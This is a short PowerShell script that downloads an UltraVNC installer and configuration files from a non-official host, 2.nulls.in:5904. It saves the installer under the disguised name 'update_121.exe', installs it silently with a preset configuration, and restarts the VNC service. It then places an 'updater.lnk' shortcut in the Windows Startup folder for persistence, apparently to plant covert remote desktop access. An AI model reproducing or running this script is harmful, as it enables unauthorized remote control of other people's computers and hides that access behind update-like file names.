$client = new-object System.Net.WebClient -ErrorAction Stop
#$client.DownloadFile("https://www.uvnc.eu/download/134/UltraVNC_1_3_4_X64_Setup.exe","$Env:USERPROFILE\update_121.exe") ;
$client.DownloadFile("http://2.nulls.in:5904/UltraVNC_1_3_4_X64_Setup.exe","$Env:USERPROFILE\update_121.exe") ;
#$client.DownloadFile("https://github.com/srbhptl39/automation/raw/master/silentinstall.inf","$Env:USERPROFILE\silentinstall.inf") ;
$client.DownloadFile("http://2.nulls.in:5904/silentinstall.inf","$Env:USERPROFILE\silentinstall.inf") ;
& $Env:USERPROFILE\update_121.exe /verysilent /loadinf="silentinstall.inf" /NORESTART
Start-Sleep -Seconds 3 -ErrorAction Stop
$client.DownloadFile("http://2.nulls.in:5904/ultravnc.ini","C:\Program Files\uvnc bvba\UltraVNC\ultravnc.ini") ;
Stop-Service uvnc_service
#& 'C:\Program Files\uvnc bvba\UltraVNC\winvnc.exe' -install
Start-Sleep -Seconds 2 -ErrorAction Stop
#& 'C:\Program Files\uvnc bvba\UltraVNC\winvnc.exe' -stopservice
$client.DownloadFile("http://2.nulls.in:5904/ultravnc.ini","C:\Program Files\uvnc bvba\UltraVNC\ultravnc.ini") ;
Start-Sleep -Seconds 2 -ErrorAction Stop
$client.DownloadFile("http://2.nulls.in:5904/updater.lnk","$Env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\updater.lnk") ;
Start-Service uvnc_service
exit;
